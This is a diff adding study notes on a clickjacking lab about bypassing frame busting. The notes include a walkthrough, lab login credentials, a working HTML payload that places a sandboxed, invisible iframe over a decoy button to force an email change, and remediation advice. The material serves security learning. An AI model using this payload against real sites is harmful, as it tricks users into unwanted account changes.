@@ -693,3 +693,241 @@ Clickjacking does NOT bypass authentication — it abuses user interaction insid
 - user unknowingly clicks real sensitive button
 
 - action executes inside authenticated session
+
+---
+
+# 🧠 Lab-3 (FRAME BUSTING BYPASS) — COMPLETE NOTES
+
+## 📌 1️⃣ OVERVIEW
+
+Clickjacking is a UI redressing attack where:
+
+User is tricked into clicking a hidden real button while thinking they are clicking a harmless element
+
+It works by:
+
+- Overlaying a transparent iframe
+- Aligning fake UI on top of real buttons
+- Exploiting trust in visual interfaces
+
+## 📌 2️⃣ WHAT IS THE TOPIC?
+
+This lab covers:
+
+### 🧩 Core concept:
+
+Clickjacking + frame busting bypass
+
+### 🧩 Key idea:
+
+Website tries to block iframe embedding using JavaScript (frame buster)
+
+### 🧩 Attacker goal:
+
+- Bypass frame busting
+- Trick user into clicking sensitive action (update email)
+
+## 📌 3️⃣ LAB OBJECTIVE
+
+Force victim to change email address by clicking a fake "Click me" button
+
+## 📌 4️⃣ ATTACK PREREQUISITES
+
+✔ Victim logged in  
+✔ Sensitive action exists (Update Email)  
+✔ Page is frameable (or bypassed using sandbox)
+
+## 📌 5️⃣ KEY VULNERABILITY
+
+Frame busting script exists:
+
+```javascript
+if (window !== window.top) {
+    window.top.location = window.location;
+}
+```
+
+Problem:
+
+- It is client-side JavaScript
+- Can be neutralized using browser sandbox
+
+## 📌 6️⃣ BYPASS TECHNIQUE
+
+```html
+sandbox="allow-forms"
+```
+
+Effect:
+
+✔ allows form submission  
+❌ blocks frame-busting escape attempts
+
+## 📌 7️⃣ LAB WALKTHROUGH (STEP-BY-STEP)
+
+### 🟢 Step 1 — Login
+
+wiener:peter
+
+### 🟢 Step 2 — Open exploit server
+
+Inject HTML payload
+
+### 🟢 Step 3 — Load target in iframe
+
+/my-account?email=attacker@email.com
+
+### 🟢 Step 4 — Overlay fake button
+
+Use `<div>` as decoy UI
+
+### 🟢 Step 5 — Align click position
+
+Use:
+
+- opacity = 0.1 (debug)
+- adjust top until overlap matches button center
+
+### 🟢 Step 6 — Final attack
+
+Set:
+
+```css
+opacity: 0.0001;
+```
+
+### 🟢 Step 7 — Deliver exploit
+
+Victim clicks → email changes → lab solved
+
+## 📌 8️⃣ FINAL PAYLOAD (WORKING VERSION)
+
+```html
+<style>
+iframe {
+    position: relative;
+    width: 500px;
+    height: 700px;
+    opacity: 0.0001;
+    z-index: 2;
+}
+
+div {
+    position: absolute;
+    top: 485px;
+    left: 80px;
+    z-index: 1;
+}
+</style>
+
+<div>CLICK ME</div>
+
+<iframe
+sandbox="allow-forms"
+src="https://YOUR-LAB-ID.web-security-academy.net/my-account?email=attacker@email.com">
+</iframe>
+```
+
+## 📌 9️⃣ PAYLOAD BREAKDOWN
+
+### 🧩 iframe
+
+Loads real victim page inside attacker page
+
+### 🧩 sandbox
+
+Prevents frame busting script from escaping iframe
+
+### 🧩 email parameter
+
+Pre-fills form automatically to speed attack
+
+### 🧩 div (fake button)
+
+Visible UI that user clicks instead of real button
+
+### 🧩 top + left
+
+Controls pixel alignment between fake and real button
+
+### 🧩 opacity
+
+Makes real page invisible but still clickable
+
+## 📌 10️⃣ REAL-WORLD SCENARIOS
+
+### 🧨 1. Banking apps
+
+- “Confirm transfer”
+- “Change email”
+- “Add beneficiary”
+
+### 🧨 2. Social media
+
+- “Follow user”
+- “Like post”
+- “Change settings”
+
+### 🧨 3. Admin panels
+
+- delete user
+- change role
+- reset password
+
+## 📌 11️⃣ VARIATIONS
+
+### 🔹 Clickjacking + CSRF combo
+
+Click triggers state-changing request with victim session
+
+### 🔹 Prefilled attack
+
+URL parameters pre-fill sensitive form values
+
+### 🔹 Hidden iframe navigation
+
+Multiple pages chained inside iframe
+
+## 📌 12️⃣ MULTI-CHAIN ATTACK MODEL
+
+Click → iframe action → authenticated request → sensitive change → backend update
+
+## 📌 13️⃣ REMEDIATION
+
+### 🛡️ 1. X-Frame-Options
+
+```http
+DENY
+SAMEORIGIN
+```
+
+Blocks iframe embedding.
+
+### 🛡️ 2. CSP frame-ancestors
+
+```http
+frame-ancestors 'none';
+```
+
+Modern and stronger protection.
+
+### 🛡️ 3. Avoid UI-based sensitive actions
+
+- Require re-authentication
+- Use confirmation tokens
+
+### 🛡️ 4. CSRF tokens (NOT enough alone)
+
+CSRF does NOT stop clickjacking
+
+## 📌 14️⃣ KEY MINDSET
+
+Clickjacking is not about hacking code — it's about hacking human perception of UI
+
+## 🔥 FINAL ONE-LINE SUMMARY
+
+Clickjacking works by hiding a real sensitive button inside an iframe and tricking the user into clicking it through a fake UI, bypassed in this lab using sandbox + pixel-perfect alignment.
+
+If you want next, I can upgrade your understanding to:
+
+👉 “real bug bounty clickjacking techniques (zero-frame-busting + CSP bypass + multi-step attacks)”
